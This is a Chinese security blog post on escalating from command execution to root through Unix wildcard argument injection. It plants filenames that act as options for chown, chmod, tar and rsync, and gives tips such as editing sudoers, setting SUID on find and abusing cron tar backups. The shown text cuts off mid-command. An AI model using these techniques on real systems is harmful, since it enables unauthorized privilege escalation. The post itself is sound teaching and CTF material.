<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content=" \u200b\t文章首发于先知社区：https://xz.aliyun.com/t/4309\n之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。\n"><title>命令执行到提权</title>
<link rel=canonical href=https://zeddyu.github.io/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.7c5ec07483cc4821866884bb5191c17c6429574614dfc6990b3635b9ca5bfa25.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="命令执行到提权"><meta property='og:description' content=" \u200b\t文章首发于先知社区：https://xz.aliyun.com/t/4309\n之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。\n"><meta property='og:url' content='https://zeddyu.github.io/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Sec'><meta property='article:tag' content='RCE'><meta property='article:published_time' content='2019-03-12T13:44:47+00:00'><meta property='article:modified_time' content='2019-03-12T13:44:47+00:00'><meta name=twitter:title content="命令执行到提权"><meta name=twitter:description content=" \u200b\t文章首发于先知社区：https://xz.aliyun.com/t/4309\n之前在补天平台首发了巧用命令注入的N种方式，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zeddyu-lu.workers.dev/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#提权>提权</a><ol><li><a href=#wildcard-wilderness>Wildcard Wilderness</a><ol><li><a href=#example-1>Example 1</a></li><li><a href=#example-2>Example 2</a></li></ol></li><li><a href=#trick>Trick</a><ol><li><a href=#file-owner-hijacking>File Owner Hijacking</a></li><li><a href=#chmod-file-reference>Chmod File Reference</a></li><li><a href=#tar命令利用>Tar命令利用</a></li><li><a href=#rsync命令利用>rsync命令利用</a></li><li><a href=#tips>Tips</a></li></ol></li><li><a href=#other>Other</a><ol><li><a href=#echo>Echo</a></li><li><a href=#ln>ln</a></li><li><a href=#shellshockcve-2014-6271>ShellShock(CVE-2014-6271)</a></li><li><a href=#从一道题看shell-shock>从一道题看Shell Shock</a></li></ol></li></ol></li><li><a href=#上篇的解释与补充>上篇的解释与补充</a><ol><li><a href=#特殊变量>特殊变量</a><ol><li><a href=#n>$n</a></li><li><a href=#ifs>$IFS</a></li><li><a href=#heading>$?</a></li><li><a href=#heading-1>$</a></li><li><a href=#heading-2>$#</a></li><li><a href=#与>$*与$@</a></li></ol></li><li><a href=#内置变量绕过>内置变量绕过</a><ol><li><a href=#bash>$BASH</a></li><li><a href=#home>$HOME</a></li><li><a href=#pwd>$PWD</a></li><li><a href=#oldpwd>$OLDPWD</a></li><li><a href=#path>$PATH</a></li><li><a href=#ps1>$PS1</a></li><li><a href=#ps2>$PS2</a></li><li><a href=#ps4>$PS4</a></li></ol></li><li><a href=#举个>举个🌰</a><ol><li><a href=#layer7-ctf-2018>Layer7 CTF 2018</a></li><li><a href=#题目描述>题目描述</a></li><li><a href=#writeup>WriteUp</a></li></ol></li></ol></li><li><a href=#参考>参考：</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/sec/ style=background-color:#0b0;color:#fff>Sec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/>命令执行到提权</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Mar 12, 2019</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>16 minute read</time></div><div class=article-readmore><a href=/p/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/>Read More…</a></div></footer></div></header><section class=article-content><blockquote><p>​ 文章首发于先知社区：https://xz.aliyun.com/t/4309</p></blockquote><p>之前在补天平台首发了<a class=link href=https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw target=_blank rel=noopener>巧用命令注入的N种方式</a>，看到了有几个师傅衍生出了不同的几个后续版本，都感觉挺不错的，对我的版本进行了一些补充。本来这个总结应该算是前半部分，想写的还没写完，当时又是在考试周，原本想在考试结束后就来写后半部分，又因为各种事给推掉了。所以现在来写后半部分提升篇，也算是对前半部分的补充与解释。</p><p>[TOC]</p><h2 id=提权>提权</h2><p>这里我们讲讲在命令注入中更有意思的一种方法。</p><h3 id=wildcard-wilderness>Wildcard Wilderness</h3><h4 id=example-1>Example 1</h4><p>首先我们先看一个示例</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;Hello Friends&#34;</span> &gt; file1
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;This is wildcard Injection&#34;</span> &gt;file2
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;take help&#34;</span> &gt; --help
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610004647.jpg loading=lazy></p><p>首先创建几个文件，其中有一个是<code>--help</code>，然后使用<code>cat</code>命令读取文件内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat file1
</span></span><span class=line><span class=cl>cat file <span class=m>2</span>
</span></span><span class=line><span class=cl>cat --help
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610007192.jpg loading=lazy></p><p>如果按照我们预期的，是不是在第三个<code>cat --help</code>处应该是要读取<code>—help</code>文件的内容呢？然而我们执行<code>cat —help</code>却优先执行了<code>cat</code>命令的帮助选项，并没有读出<code>—help</code>里的内容。</p><p>不仅是<code>cat</code>，<code>ls</code>等命令也会优先调用内置<code>--help</code>选项。</p><p><img src=https://blogpic.zdy.one/img/20190610009843.jpg loading=lazy></p><p>以及还有<code>--all</code>选项。</p><p><img src=https://blogpic.zdy.one/img/20190610007699.jpg loading=lazy></p><p>其实讲道理，词法分析把对诸如<code>--help</code>、<code>--all</code>等选项优先处理为内置选项输出，看起来并没有任何问题</p><p>这个技巧叫做<code>Wildcard wildness</code>，中文有人译为通配符在野。(<code>-all</code>、<code>--help</code>可以通过加入<code>./</code>成<code>./-all</code>、<code>./--help</code>来特指这个文件，避免这个问题)</p><h4 id=example-2>Example 2</h4><p><img src=https://blogpic.zdy.one/img/20190610008865.jpg loading=lazy></p><p>如图，我们有两个文件，当用<code>rm *</code>的时候，只删掉了<code>file1</code>与<code>file2</code>，并没有删除<code>*</code></p><p><img src=https://blogpic.zdy.one/img/20190610001503.jpg loading=lazy></p><p>或者使用<code>rm file1 file2 -rf</code>逐个删除之时，也只删掉了<code>file1</code>与<code>file2</code></p><p>使用<code>strace rm *</code>我们可以发现</p><p><img src=https://blogpic.zdy.one/img/20190610005779.jpg loading=lazy></p><p>由于当前目录中存在<code>-rf</code>文件名，<code>rm</code>将<code>-rf</code>选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上<code>./-rf</code>进行删除</p><h3 id=trick>Trick</h3><p>我们可以利用<code>Wildcard Wilderness</code>做一些更有用的事情。</p><h4 id=file-owner-hijacking>File Owner Hijacking</h4><p>现在我们有三个用户，一个<code>zedd</code>，一个<code>test</code>，一个<code>root</code>用户。</p><p>我们分别用<code>zedd</code>与<code>test</code>创建了不同的文件，<code>1.php</code>与<code>test.php</code>都属于<code>test</code>用户的文件，<code>zedd.php</code>与<code>--reference=zedd.php</code>均属于<code>zedd</code>用户的文件。</p><p><img src=https://blogpic.zdy.one/img/20190610005137.jpg loading=lazy></p><p>然后使用<code>root</code>用户使用<code>chown -R test:test *.php</code>命令，想把本目录下所有的<code>.php</code>文件修改为<code>test</code>用户所有。</p><p><img src=https://blogpic.zdy.one/img/20190610008433.jpg loading=lazy></p><p>但是结果我们可以发现，结果该目录下所有的<code>.php</code>文件都被修改为了<code>zedd</code>用户所有，成功“提权”。</p><p>原理我们可以用<code>strace chown -R zedd:zedd *.php</code>来看一下（注意这里换了一下，模拟想把<code>.php</code>文件改变成<code>zedd</code>用户所有）</p><p><img src=https://blogpic.zdy.one/img/20190610009617.jpg loading=lazy></p><p>我们可以看到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>execve<span class=o>(</span><span class=s2>&#34;/bin/chown&#34;</span>, <span class=o>[</span><span class=s2>&#34;chown&#34;</span>, <span class=s2>&#34;-R&#34;</span>, <span class=s2>&#34;zedd:zedd&#34;</span>, <span class=s2>&#34;config.php&#34;</span>, <span class=s2>&#34;index.php&#34;</span>, <span class=s2>&#34;--reference=.backdoor.php&#34;</span><span class=o>]</span>, 0x7ffe5b43b1e8 /* <span class=m>35</span> vars */<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><p>跟我们上个例子原理其实一样，<code>--reference=.backdoor.php</code>被作为一个选项进行了处理，而</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>--reference=RFILE  use RFILE&#39;s owner and group rather than
</span></span><span class=line><span class=cl>                         specifying OWNER:GROUP values
</span></span></code></pre></td></tr></table></div></div><p><code>--reference=RFILE</code>这个选项则是使用<code>RFILE</code>的文件拥有者和用户组来改变文件属性，而不是使用传入的<code>OWNER:GROUP</code>参数。</p><p>因此，在这种情况下，<code>chown</code>的<code>--reference</code>选项将覆盖指定为<code>root</code>用户输入的参数<code>zedd:zedd</code>，把此目录中所有<code>.php</code>文件的所有者改变与<code>.backdoor.php</code>的所有者<code>test</code>。</p><p><img src=https://blogpic.zdy.one/img/20190610003986.jpg loading=lazy></p><p>所以，按照这种方法，我们可以劫持<code>root</code>将文件的所有权更改为任意用户，并“劫持”我们想要的文件。</p><h4 id=chmod-file-reference>Chmod File Reference</h4><p>类似<code>chown</code>的还有一个命令<code>chmod</code>，它也有<code>--reference=RFIE</code>的选项</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--reference<span class=o>=</span>RFILE  use RFILE<span class=err>&#39;</span>s mode instead of MODE values
</span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610000066.jpg loading=lazy></p><p>与<code>chown</code>类似，因为有<code>--reference=.backdoor.php</code>的存在，在使用<code>chmod 000 *</code>的时候也会把劫持到与<code>.backdoor.php</code>文件权限一样的权限</p><h4 id=tar命令利用>Tar命令利用</h4><p>首先我们来看看<code>tar</code>命令帮助文档中的几个有意思的选项</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--checkpoint<span class=o>[=</span>NUMBER<span class=o>]</span>  
</span></span><span class=line><span class=cl>	display progress messages every NUMBERth record <span class=o>(</span>default 10<span class=o>)</span>
</span></span><span class=line><span class=cl>--checkpoint-action<span class=o>=</span>ACTION   
</span></span><span class=line><span class=cl>	execute ACTION on each checkpoint
</span></span></code></pre></td></tr></table></div></div><p>从帮助文档，我们大致可以从中理解到，<code>--checkpoint=1</code>可以用来显示信息，<code>--checkpoint-action=exec=sh shell.sh</code>可以用来执行命令</p><p>先尝试构建一个<code>shell.sh</code>脚本，内容为<code>/usr/bin/id</code>，以及文件名为<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>的文件，使用<code>tar -cf test.tar *</code>把当前目录下所有文件压缩到<code>test.tar</code>压缩包内</p><p><img src=https://blogpic.zdy.one/img/20190610008945.jpg loading=lazy></p><p>可见，<code>/usr/bin/id</code>已经被成功执行输出。</p><p><img src=https://blogpic.zdy.one/img/20190610007928.jpg loading=lazy></p><p>与之前一样，<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>被作为选项处理</p><p><img src=https://blogpic.zdy.one/img/20190610007550.jpg loading=lazy></p><p>在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: <a class=link href=https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98 target=_blank rel=noopener>2018SWPUCTF-Web#信息再次发掘</a></p><h4 id=rsync命令利用>rsync命令利用</h4><p><code>rsync</code>命令可能比较少用，我们这里简单介绍一下</p><blockquote><p>NAME</p><p>​ rsync - a fast, versatile, remote (and local) file-copying tool</p></blockquote><p><code>rsync</code>命令是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。使用一个远程shell程序(如<a class=link href=http://man.linuxde.net/rsh target=_blank rel=noopener>rsh</a>、<a class=link href=http://man.linuxde.net/ssh target=_blank rel=noopener>ssh</a>)来实现将本地机器的内容拷贝到远程机器。如：<code>rsync -t *.c foo:src</code>，复制当前本地文件夹下的所有的<code>.c</code>文件到 foo 远程服务器的<code>/src</code>文件夹下。</p><p><code>rsync</code>帮助文档含有以下几个比较有意思的选项</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>-e, --rsh<span class=o>=</span>COMMAND           specify the remote shell to use
</span></span><span class=line><span class=cl>    --rsync-path<span class=o>=</span>PROGRAM    specify the rsync to run on remote machine
</span></span></code></pre></td></tr></table></div></div><p><code>--rsh=COMMAND</code>又是一个我们可以利用的地方，我们首先创建一个文件名为<code>-e sh shell.c</code>的文件，然后再创建一个<code>shell.c</code>文件，污染<code>rsync</code>参数来实现执行我们在<code>shell.c</code>中写入的预期命令</p><p>假设当前目录下我们拥有一个只有<code>root</code>用户可读的<code>rootfile</code>文件，由于不能直接输出结果，我们可以构造<code>cat ./rootfile > ./output</code>，将文件内容读出。</p><p><img src=https://blogpic.zdy.one/img/20190610004148.jpg loading=lazy></p><p>得到的<code>output</code>文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行<code>rsync</code>用户的权限，不是直接的<code>root</code>权限，这里因为执行命令的是<code>root</code>权限，所以能读取只有<code>root</code>用户才能读取的<code>rootfile</code>文件</p><h4 id=tips>Tips</h4><ul><li><p>既然能执行命令，其实我们可以参照上篇列举的反弹 shell 的方式将 shell 反弹给我们，也可以配合<code>msfvenom</code>来使用。</p></li><li><p><code>tar</code>命令比较多的都用在<code>/etc/crontab</code>计划任务中，经常会有管理员会用<code>crontab</code>来执行一些<code>tar</code>命令的备份操作，而且<code>crontab</code>执行的权限还是<code>root</code>权限，所以这是个很好利用的点</p></li><li><p><code>tar</code>命令需要进入到<code>--checkpoint=1</code>文件所在的目录内，如果加上绝对路径将会失效，例如<code>tar cf test.tar /var/www/html/*</code></p><p><img src=https://blogpic.zdy.one/img/20190610005324.jpg loading=lazy></p><p>我们可以看到 shell 处理方式将<code>/home/zedd/Desktop/test</code>与目录下的文件名逐个拼接起来，就达不到污染参数的效果了</p></li><li><p>还可以用<code>echo "zedd ALL=(root) NOPASSWD: ALL" > /etc/sudoers</code>，把自己直接写入管理员组</p></li><li><p>利用<code>chmod u+s /usr/bin/find</code>提升为<code>root</code>权限执行，配合<code>find</code>命令的<code>-exec COMMAND</code>来执行命令，例如<code>find f1 -exec "whoami" \;</code></p><p><img src=https://blogpic.zdy.one/img/20190610009998.jpg loading=lazy></p></li></ul><p>文章中讨论的技术可以以不同的形式在各种流行的Unix工具上应用，这里仅仅是抛砖引玉，列举一部分命令。 在实际攻击中，任意 shell 选项/参数都可以隐藏在常规文件中，管理员也不容易发现，比如使用<code>.backdoor.php</code>等形式。</p><h3 id=other>Other</h3><p>这里讲讲几个虽然不属于提权，但是也比较有意思的几个点。</p><h4 id=echo>Echo</h4><p><code>echo *</code>可以用来显示目录，<code>echo /???g</code>可以用来探测文件</p><p><img src=https://blogpic.zdy.one/img/20190610008270.jpg loading=lazy></p><h4 id=ln>ln</h4><blockquote><p>NAME</p><p>​ ln - make links between files</p></blockquote><p><code>ln</code>命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考<a class=link href=https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html target=_blank rel=noopener>理解Linux硬链接与软链接</a>。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用<code>ln -s</code>创建</p><p>例如，这里我们根目录下有一个文件内容为<code>flag{xxx}</code>的名为<code>flag</code>文件，我们使用<code>ln -s /flag file</code>，在当前目录下创建一个<code>file</code>文件链接到<code>/flag</code>，使用<code>cat file</code>与<code>php -r "echo file_get_contents('file')" 